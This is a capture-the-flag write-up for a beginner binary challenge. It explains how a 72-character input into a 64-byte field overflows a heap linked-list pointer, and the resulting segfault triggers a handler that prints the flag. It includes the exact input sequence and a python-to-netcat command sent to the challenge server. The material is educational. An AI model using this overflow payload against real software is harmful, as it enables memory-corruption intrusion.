# n00bcak's Last Straw

## Overview

The challenge installs a custom handler for `SIGSEGV`:

```c
signal(SIGSEGV, win);
```

This means that causing a segmentation fault is enough to execute `win()`, which reads and prints the flag.

## Vulnerability

Each straw is represented by this structure:

```c
struct straw {
    struct straw* next_ptr;
    char data[0x40];
};
```

The memory layout can be represented as such. The ptr will be 8 bytes on a 64 bit machine and data is 64 byte char array:

```text
offset 0x00: next_ptr — 8 bytes
offset 0x08: data     — 64 bytes
```

However, `edit_straw()` accepts up to 72 characters for the 64-byte `data` field:

```c
scanf("%72s", cur_straw->data);
```

The eight extra characters overflow into the following straw's metadata. `scanf()` also appends a null terminator, corrupting another byte.

## Building the corrupted list

Initially, the list contains one straw:

```text
straw 0 -> NULL
```

We need **three total straws**, so we enter `1` twice. The list then becomes:

```text
straw 0 -> straw 1 -> straw 2 -> NULL
```

This distinction matters. With only one `1`, the list is:

```text
straw 0 -> straw 1 -> NULL
```

The overflow from straw 0 reaches straw 1's `next_ptr`, but straw 1 is already the final node and its pointer is `NULL`. With three total straws, straw 1's pointer contains the address of straw 2. Corrupting that non-null pointer gives the later traversal an invalid address to follow.

Editing straw 0 with 72 characters overflows into the memory occupied by straw 1 and corrupts its `next_ptr`:

```text
Before:  straw 0 -> straw 1 -> straw 2
After:   straw 0 -> straw 1 -> invalid pointer
```

When another straw is created, `create_straw()` walks the linked list:

```c
while (last_straw->next_ptr != NULL) {
    last_straw = last_straw->next_ptr;
}
```

The traversal follows the corrupted pointer and dereferences invalid memory, producing `SIGSEGV`. The registered signal handler then calls `win()` and prints the flag.

## Exploit

The interaction is:

```text
1
1
2
0
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
1
```

The steps are:

1. Create straw 1. There is now one additional straw.
2. Create straw 2. There are now three straws total, creating a non-null pointer that can be corrupted.
3. Select the edit option.
4. Edit straw 0.
5. Enter exactly 72 `A` characters.
6. Create another straw to trigger traversal of the corrupted pointer.

The payload can be sent automatically with:

```bash
python3 -c 'print("1\n1\n2\n0\n" + "A"*72 + "\n1\n")' | nc challs.nusgreyhats.org 32000
```


## Conclusion

The challenge is solved by combining a heap based buffer overflow with the existing `SIGSEGV` handler. The oversized input corrupts the linked-list pointer, and the next list traversal causes the segmentation fault that invokes `win()`.
